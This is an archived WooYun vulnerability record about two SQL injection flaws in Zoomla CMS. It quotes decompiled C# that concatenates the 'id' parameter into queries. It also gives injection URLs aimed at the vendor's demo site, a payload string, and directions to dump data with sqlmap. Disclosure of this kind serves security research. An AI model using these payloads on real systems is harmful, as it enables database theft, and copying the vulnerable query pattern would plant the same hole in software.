{"id": 7244, "wybug_id": "wooyun-2013-046434", "wybug_title": "逐浪CMS通用型SQL注入8+9（select型）", "wybug_corp": "逐浪CMS", "wybug_author": "wefgod", "wybug_date": "2013-12-19 11:58", "wybug_open_date": "2013-12-24 11:59", "wybug_type": "SQL注射漏洞", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t1970-01-01：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t1970-02-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t1970-03-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t1970-03-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向公众公开  简要描述： 似乎逐浪开始想完全闭源了。已经准备阻止大家进行反编译了，暂时还不知道是用什么方法，以后如果研究出来的话再说吧。所以官方别再扯什么XXX源码包了，不开源不是丢人的事情，但是忽悠客户不是很好吧。 详细说明：  相关的类：public class MIS_Target_planList : Page, IRequiresSessionStatepublic class MIS_Target_ProList : Page, IRequiresSessionState   漏洞证明：  注入点1：\npublic class MIS_Target_planList : Page, IRequiresSessionState    protected void Page_Load(object sender, EventArgs e)    {        this.buser.CheckIsLogin();        if (!base.IsPostBack && !string.IsNullOrEmpty(base.Request[\"id\"]))        {            this.id = DataConverter.CLng(base.Request[\"id\"]);  //id参数第一次过滤了            this.dt = this.bll.Sel(\"MID =\" + base.Request[\"id\"], \"ID desc\"); //id参数第二次直接带入查询中了            if (this.dt != null && this.dt.Rows.Count > 0)            {                this.Repeater3.DataSource = this.dt;                this.Repeater3.DataBind();            }        }    }\n前台注册用户。http://demo.zoomla.cn/Mis/Plan/AddPlan.aspx添加计划访问http://demo.zoomla.cn/mis/target/planList.aspx?id=0可以看见计划都列出来了，把上面这个URL丢到工具里面，带上cookie即可：\n\n注入点2：\npublic class MIS_Target_ProList : Page, IRequiresSessionState    protected global_asax ApplicationInstance    {        get        {            return (global_asax)this.Context.ApplicationInstance;        }    }    protected void Page_Load(object sender, EventArgs e)    {        this.buser.CheckIsLogin();        if (!base.IsPostBack && !string.IsNullOrEmpty(base.Request[\"types\"]) && base.Request[\"types\"].ToString() == \"7\" && !string.IsNullOrEmpty(base.Request[\"id\"]))        {            this.id = DataConverter.CLng(base.Request[\"id\"]);            this.dt = this.bll.Sel(\"TargetID like '%\" + base.Request[\"id\"] + \"%' And IsSystem=0 \", \"ID desc\"); //id参数没有过滤就带入SQL查询            if (this.dt != null && this.dt.Rows.Count > 0)            {                this.Repeater3.DataSource = this.dt;                this.Repeater3.DataBind();            }        }    }\n注册前台用户并登录http://demo.zoomla.cn/Mis/Project/Default.aspx点击新建项目随意新建一个项目。打开http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&id=3页面空白打开http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&id=3%' or '%'='所有添加的项目信息都在里面把下面的链接还有cookie丢sqlmap就可以暴数据了http://demo.zoomla.cn/mis/target/prolist.aspx?types=7&id=3%' or '1'='1'*--\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-24 11:59 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-23 10:37 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  防止你搞 不让你反编译 但是闭源往往意味着 更多的安全问题  仅是门槛高些 呵呵    \n     2013-12-23 17:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 哈，乌云这又不收他钱，不要白不要。嘿嘿。 另外必定是忽略的节奏！    \n     2013-12-23 19:51 |    \t\t在路上 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:13        | 在学习的路上、在成长的路上...)\t\t \n  @wefgod 乌云有奖励的 我看好你哦 (分我点)    \n     2013-12-24 10:15 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @在路上 哈哈，下次10QB，哈    \n     2014-01-03 15:19 |    \t\t0xTback \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 初入江湖，请多多关照~！！！)\t\t \n  求逐浪源码。。。。    \n     2014-01-03 15:28 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @0xTback 7月的那个还没有做混淆和加密，可以用那个    \n     2014-01-03 22:04 |    \t\t0xTback \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 初入江湖，请多多关照~！！！)\t\t \n  @wefgod 你说的是CMS2 X1.1？    \n     2014-01-04 21:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @0xTback 目前开放下载的最新也就这个版本吧。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}